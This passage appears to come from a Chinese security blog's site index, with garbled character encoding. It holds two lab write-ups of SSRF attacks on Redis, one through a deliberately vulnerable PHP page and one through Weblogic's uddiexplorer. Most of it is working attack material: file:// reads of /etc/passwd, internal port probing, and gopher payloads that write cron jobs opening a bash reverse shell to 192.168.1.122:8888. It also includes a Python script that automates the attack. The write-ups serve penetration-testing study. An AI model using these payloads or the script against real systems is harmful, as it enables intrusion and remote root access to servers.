åº”ç”¨æœåŠ¡å™¨ï¼šï¼ˆ192.168.1.191ï¼‰ dockerï¼šssrf_redis_demoã€ssrf_redis docker pull luoshy/ssrf_redis ä»£ç ç¤ºä¾‹ ssrf.php 123456789&lt;?php$ch = curl_init(); //åˆ›å»ºæ–°çš„ cURL èµ„æºcurl_setopt($ch, CURLOPT_URL, $_GET['url']); //è®¾ç½®URL å’Œç›¸åº”çš„é€‰é¡¹#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_HEADER, 0);#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);curl_exec($ch); //æŠ“å– URL å†…å®¹å¹¶æŠŠå®ƒä¼ é€’ç»™æµè§ˆå™¨ï¼Œå­˜å‚¨è¿›æ–‡ä»¶curl_close($ch); ////å…³é—­ cURL èµ„æºï¼Œå¹¶ä¸”é‡Šæ”¾ç³»ç»Ÿèµ„æº?&gt; post.php 12345678910&lt;html&gt;&lt;head&gt; &lt;title&gt;post&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;?php echo $_REQUEST[cmd]; ?&gt;&lt;/body&gt;&lt;/html&gt; fileåè®®åˆ©ç”¨åˆ©ç”¨fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶ 1curl -vvv &quot;192.168.1.191:32768/ssrf.php?url=file:///etc/passwd&quot; dictåè®®åˆ©ç”¨1curl -vvv &quot;192.168.1.191:32768/ssrf.php?url=dict://172.17.0.2:6379/info&quot; gopheråè®®åˆ©ç”¨è¿™é‡Œä¸»è¦åˆ©ç”¨gopheråè®®è¿›è¡Œshellåå¼¹ æ”»å‡»payloadç”Ÿæˆrediså®¢æˆ·ç«¯åå¼¹shellå‘½ä»¤ 12345set greet &quot;\\n\\n\\n\\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.1.122/8888 0&gt;&amp;1\\n\\n\\n\\n&quot;config set dir /var/spool/cron/config set dbfilename rootsavequit è¿›è¡Œurlç¼–ç  1%73%65%74%20%67%72%65%65%74%20%22%5c%6e%5c%6e%5c%6e%5c%6e%2a%20%2a%20%2a%20%2a%20%2a%20%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%2e%31%32%32%2f%38%38%38%38%20%30%3e%26%31%5c%6e%5c%6e%5c%6e%5c%6e%22%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%69%72%20%2f%76%61%72%2f%73%70%6f%6f%6c%2f%63%72%6f%6e%2f%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%62%66%69%6c%65%6e%61%6d%65%20%72%6f%6f%74%0a%73%61%76%65%0a%71%75%69%74%0a å°†å…¶ä¸­çš„%0aæ›¿æ¢æˆ%0d%0a 1%73%65%74%20%67%72%65%65%74%20%22%5c%6e%5c%6e%5c%6e%5c%6e%2a%20%2a%20%2a%20%2a%20%2a%20%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%2e%31%32%32%2f%38%38%38%38%20%30%3e%26%31%5c%6e%5c%6e%5c%6e%5c%6e%22%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%69%72%20%2f%76%61%72%2f%73%70%6f%6f%6c%2f%63%72%6f%6e%2f%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%62%66%69%6c%65%6e%61%6d%65%20%72%6f%6f%74%0d%0a%73%61%76%65%0d%0a%71%75%69%74%0d%0a è¿›è¡ŒurläºŒæ¬¡è½¬ç  1%25%37%33%25%36%35%25%37%34%25%32%30%25%36%37%25%37%32%25%36%35%25%36%35%25%37%34%25%32%30%25%32%32%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%32%61%25%32%30%25%32%61%25%32%30%25%32%61%25%32%30%25%32%61%25%32%30%25%32%61%25%32%30%25%36%32%25%36%31%25%37%33%25%36%38%25%32%30%25%32%64%25%36%39%25%32%30%25%33%65%25%32%36%25%32%30%25%32%66%25%36%34%25%36%35%25%37%36%25%32%66%25%37%34%25%36%33%25%37%30%25%32%66%25%33%31%25%33%39%25%33%32%25%32%65%25%33%31%25%33%36%25%33%38%25%32%65%25%33%31%25%32%65%25%33%31%25%33%32%25%33%32%25%32%66%25%33%38%25%33%38%25%33%38%25%33%38%25%32%30%25%33%30%25%33%65%25%32%36%25%33%31%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%32%32%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%39%25%37%32%25%32%30%25%32%66%25%37%36%25%36%31%25%37%32%25%32%66%25%37%33%25%37%30%25%36%66%25%36%66%25%36%63%25%32%66%25%36%33%25%37%32%25%36%66%25%36%65%25%32%66%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%32%25%36%36%25%36%39%25%36%63%25%36%35%25%36%65%25%36%31%25%36%64%25%36%35%25%32%30%25%37%32%25%36%66%25%36%66%25%37%34%25%30%64%25%30%61%25%37%33%25%36%31%25%37%36%25%36%35%25%30%64%25%30%61%25%37%31%25%37%35%25%36%39%25%37%34%25%30%64%25%30%61 æ‹¼æ¥ssrfæ”»å‡»åœ°å€ç”Ÿæˆæœ€ç»ˆpayload 1curl -vvv &quot;192.168.1.191:32768/ssrf.php?url=gopher://172.17.0.2:6379/_%25%37%33%25%36%35%25%37%34%25%32%30%25%36%37%25%37%32%25%36%35%25%36%35%25%37%34%25%32%30%25%32%32%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%32%61%25%32%30%25%32%61%25%32%30%25%32%61%25%32%30%25%32%61%25%32%30%25%32%61%25%32%30%25%36%32%25%36%31%25%37%33%25%36%38%25%32%30%25%32%64%25%36%39%25%32%30%25%33%65%25%32%36%25%32%30%25%32%66%25%36%34%25%36%35%25%37%36%25%32%66%25%37%34%25%36%33%25%37%30%25%32%66%25%33%31%25%33%39%25%33%32%25%32%65%25%33%31%25%33%36%25%33%38%25%32%65%25%33%31%25%32%65%25%33%31%25%33%32%25%33%32%25%32%66%25%33%38%25%33%38%25%33%38%25%33%38%25%32%30%25%33%30%25%33%65%25%32%36%25%33%31%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%32%32%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%39%25%37%32%25%32%30%25%32%66%25%37%36%25%36%31%25%37%32%25%32%66%25%37%33%25%37%30%25%36%66%25%36%66%25%36%63%25%32%66%25%36%33%25%37%32%25%36%66%25%36%65%25%32%66%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%32%25%36%36%25%36%39%25%36%63%25%36%35%25%36%65%25%36%31%25%36%64%25%36%35%25%32%30%25%37%32%25%36%66%25%36%66%25%37%34%25%30%64%25%30%61%25%37%33%25%36%31%25%37%36%25%36%35%25%30%64%25%30%61%25%37%31%25%37%35%25%36%39%25%37%34%25%30%64%25%30%61&quot; æ”»å‡»åˆ©ç”¨æœ¬åœ°æ”»å‡»æœºå¼€å¯ç«¯å£ç›‘å¬ 1nc -lvvp 8888 æ”»å‡»æœºå‘é€æ”»å‡»payload åå¼¹shellæˆåŠŸ rediså¿«é€Ÿåå¼¹shellæ”»å‡»è„šæœ¬1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/local/env python3# -*- coding:utf-8 -*-import urllibimport requests#è„šæœ¬å‚æ•°ä¿®æ”¹å¤„REVERSE_IP = '192.168.1.122' #åå¼¹shellçš„ipREVERSE_PORT = '8888' # åå¼¹shellçš„ç«¯å£CRON_PATH = '/var/spool/cron/' #å†™å…¥è®¡åˆ’ä»»åŠ¡çš„ç›®æ ‡è·¯å¾„ï¼Œå¯èƒ½ä¼šä¸åŒCRON_FILENAME = 'root' #å†™å…¥è®¡åˆ’ä»»åŠ¡çš„æ–‡ä»¶åDEST_REDIS_IP = '172.17.0.2' #å­˜åœ¨redisçš„ç›®æ ‡ä¸»æœºIPSSRF_VUL_IP = 'http://192.168.1.191:32768/ssrf.php?url='# ç”Ÿæˆpayloaddef generate_payload(): gopher = &quot;gopher://{}:6379/_&quot;.format(DEST_REDIS_IP) redis_command = &quot;&quot;&quot;set 1 &quot;\\\\n\\\\n* * * * * bash -i &gt;&amp; /dev/tcp/{}/{} 0&gt;&amp;1\\\\n\\\\n&quot;config set dir {}config set dbfilename {}savequit &quot;&quot;&quot;.format(REVERSE_IP, REVERSE_PORT, CRON_PATH, CRON_FILENAME) urlencode_one = urllib.parse.quote(redis_command, 'utf-8') replace_str = urlencode_one.replace('%0A', '%0D%0A') urlencode_two = urllib.parse.quote(replace_str, 'utf-8') payload = gopher + urlencode_two return payloaddef main(): payload = generate_payload() url = SSRF_VUL_IP + payload print(url) res = requests.get(url = url, timeout = 1) print(res.text)if __name__ == '__main__': main()","link":"/2019/07/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/ssrf/ssrf-redis/"},{"title":"Weblogic ssrfæ”»å‡»å®æˆ˜","text":"ç¯å¢ƒå¤ç°Weblogicä¸­å­˜åœ¨ä¸€ä¸ªSSRFæ¼æ´ï¼Œåˆ©ç”¨è¯¥æ¼æ´å¯ä»¥å‘é€ä»»æ„HTTPè¯·æ±‚ï¼Œè¿›è€Œæ”»å‡»å†…ç½‘ä¸­redisã€fastcgiç­‰è„†å¼±ç»„ä»¶ã€‚ ç¯å¢ƒé‡‡ç”¨vulhubä¸Šç°æœ‰dockerç¯å¢ƒè¿›è¡Œå¤ç° 12docker-compose builddocker-compose up -d è®¿é—®http://your-ip:7001/uddiexplorer/ï¼Œæ— éœ€ç™»å½•å³å¯æŸ¥çœ‹uddiexploreråº”ç”¨ã€‚ ssrfæ¼æ´æµ‹è¯•æ¼æ´ä½ç½® 1http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp payload 1?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001 è¿™é‡Œé»˜è®¤å­˜åœ¨ä¸€ä¸ªè¿œç¨‹èµ„æºçš„åŠ è½½ï¼Œä¸”æœªç»è¿‡ä¸¥æ ¼è¿‡æ»¤ ssrfæ¼æ´æ¢æµ‹å†…ç½‘ä¸»æœºç«¯å£å¯è®¿é—®çš„ç«¯å£ä¼šå¾—åˆ°é”™è¯¯ï¼Œä¸€èˆ¬ä¼šè¿”å›status code,å¦‚æœè®¿é—®çš„æ˜¯éhttpçš„ç«¯å£ï¼Œåˆ™è¿”å› which did not have a valid SOAP content-type ä¿®æ”¹è®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„ç«¯å£ï¼Œåˆ™è¿”å›could not connect over HTTP to server é€šè¿‡è¿”å›çš„é”™è¯¯ä¸åŒï¼Œæˆ‘ä»¬å¯ä»¥åˆ¤æ–­å‡ºå†…ç½‘ä¸»æœºå¼€æ”¾äº†å“ªäº›ç«¯å£ã€‚ ssrfæ¼æ´redisåå¼¹shellæ¢æµ‹å†…ç½‘çš„rediså‘ç°ç›®æ ‡åœ¨192.168.128.2 å®šæ—¶ä»»åŠ¡payload 12345678testset 1 &quot;\\n\\n\\n\\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.1.122/8888 0&gt;&amp;1\\n\\n\\n\\n&quot;config set dir /etc/config set dbfilename crontabsaveaaa è¿›è¡Œurlç¼–ç  1test%0A%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.122%2F8888%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0Aconfig%20set%20dir%20%2Fetc%2F%0Aconfig%20set%20dbfilename%20crontab%0Asave%0A%0Aaaa å°†å…¶ä¸­çš„%0aæ›¿æ¢æˆ%0d%0a 1test%0d%0a%0d%0aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.122%2F8888%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0d%0aconfig%20set%20dir%20%2Fetc%2F%0d%0aconfig%20set%20dbfilename%20crontab%0d%0asave%0d%0a%0d%0aaaa å‘èµ·æ”»å‡» ä¸»æœºæˆåŠŸä¸Šçº¿","link":"/2020/08/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/ssrf/ssrf-weblogic-redis/"}],"tags":[{"name":"windows","slug":"windows","link":"/tags/windows/"},{"name":"tools","slug":"tools","link":"/tags/tools/"},{"name":"ä¿¡æ¯æ”¶é›†","slug":"ä¿¡æ¯æ”¶é›†","link":"/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"çº¢æ—¥é¶åœº","slug":"çº¢æ—¥é¶åœº","link":"/tags/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/"},{"name":"å†…ç½‘æ¸—é€","slug":"å†…ç½‘æ¸—é€","link":"/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"ä»£ç†è½¬å‘","slug":"ä»£ç†è½¬å‘","link":"/tags/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/"},{"name":"log4j2","slug":"log4j2","link":"/tags/log4j2/"},{"name":"jboss","slug":"jboss","link":"/tags/jboss/"},{"name":"shiro","slug":"shiro","link":"/tags/shiro/"},{"name":"æº¯æºåˆ†æ","slug":"æº¯æºåˆ†æ","link":"/tags/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/"},{"name":"SCTF2021","slug":"SCTF2021","link":"/tags/SCTF2021/"},{"name":"ç½‘é¼æ¯","slug":"ç½‘é¼æ¯","link":"/tags/%E7%BD%91%E9%BC%8E%E6%9D%AF/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"çº¢å¸½æ¯","slug":"çº¢å¸½æ¯","link":"/tags/%E7%BA%A2%E5%B8%BD%E6%9D%AF/"},{"name":"é¢è¯•é¢˜","slug":"é¢è¯•é¢˜","link":"/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"name":"åå¼¹shell","slug":"åå¼¹shell","link":"/tags/%E5%8F%8D%E5%BC%B9shell/"},{"name":"ç«¯å£è½¬å‘","slug":"ç«¯å£è½¬å‘","link":"/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"},{"name":"çŸ¥è¯†ä½“ç³»","slug":"çŸ¥è¯†ä½“ç³»","link":"/tags/%E7%9F%A5%E8%AF%86%E4%BD%93%E7%B3%BB/"},{"name":"ubuntu","slug":"ubuntu","link":"/tags/ubuntu/"},{"name":"apt","slug":"apt","link":"/tags/apt/"},{"name":"å›¾åºŠé…ç½®","slug":"å›¾åºŠé…ç½®","link":"/tags/%E5%9B%BE%E5%BA%8A%E9%85%8D%E7%BD%AE/"},{"name":"åšå®¢è¿ç§»","slug":"åšå®¢è¿ç§»","link":"/tags/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB/"},{"name":"mysql","slug":"mysql","link":"/tags/mysql/"},{"name":"æ•°æ®åº“ææƒ","slug":"æ•°æ®åº“ææƒ","link":"/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/"},{"name":"MsSQL","slug":"MsSQL","link":"/tags/MsSQL/"},{"name":"MySQL","slug":"MySQL","link":"/tags/MySQL/"},{"name":"Redis","slug":"Redis","link":"/tags/Redis/"},{"name":"Oracle","slug":"Oracle","link":"/tags/Oracle/"},{"name":"docker","slug":"docker","link":"/tags/docker/"},{"name":"æŠ¤ç½‘æ¼”ç»ƒ","slug":"æŠ¤ç½‘æ¼”ç»ƒ","link":"/tags/%E6%8A%A4%E7%BD%91%E6%BC%94%E7%BB%83/"},{"name":"PHP","slug":"PHP","link":"/tags/PHP/"},{"name":"thinkphp5","slug":"thinkphp5","link":"/tags/thinkphp5/"},{"name":"thinkphp3","slug":"thinkphp3","link":"/tags/thinkphp3/"},{"name":"74cms","slug":"74cms","link":"/tags/74cms/"},{"name":"PHPè¯­è¨€ç‰¹æ€§","slug":"PHPè¯­è¨€ç‰¹æ€§","link":"/tags/PHP%E8%AF%AD%E8%A8%80%E7%89%B9%E6%80%A7/"},{"name":"PHPååºåˆ—åŒ–","slug":"PHPååºåˆ—åŒ–","link":"/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"SSTI","slug":"SSTI","link":"/tags/SSTI/"},{"name":"Flask","slug":"Flask","link":"/tags/Flask/"},{"name":"Pickle","slug":"Pickle","link":"/tags/Pickle/"},{"name":"PyYaml","slug":"PyYaml","link":"/tags/PyYaml/"},{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","link":"/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"sql-injection","slug":"sql-injection","link":"/tags/sql-injection/"},{"name":"redis","slug":"redis","link":"/tags/redis/"},{"name":"SSRF","slug":"SSRF","link":"/tags/SSRF/"}],"categories":[{"name":"ä¸ªäººéšç¬”","slug":"ä¸ªäººéšç¬”","link":"/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"},{"name":"å·¥å…·å¼€å‘","slug":"å·¥å…·å¼€å‘","link":"/categories/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/"},{"name":"å†…ç½‘æ¸—é€","slug":"å†…ç½‘æ¸—é€","link":"/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"æ”»é˜²æ¸—é€","slug":"æ”»é˜²æ¸—é€","link":"/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"},{"name":"Security","slug":"Security","link":"/categories/Security/"},{"name":"vulfocus","slug":"vulfocus","link":"/categories/vulfocus/"},{"name":"å®‰å…¨ç«èµ›","slug":"å®‰å…¨ç«èµ›","link":"/categories/%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/"},{"name":"webå®‰å…¨","slug":"webå®‰å…¨","link":"/categories/web%E5%AE%89%E5%85%A8/"},{"name":"Linux","slug":"Linux","link":"/categories/Linux/"},{"name":"ç¯å¢ƒé…ç½®","slug":"ç¯å¢ƒé…ç½®","link":"/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"},{"name":"PHPä»£ç å®¡è®¡","slug":"PHPä»£ç å®¡è®¡","link":"/categories/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"pythonä»£ç å®¡è®¡","slug":"pythonä»£ç å®¡è®¡","link":"/categories/python%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]}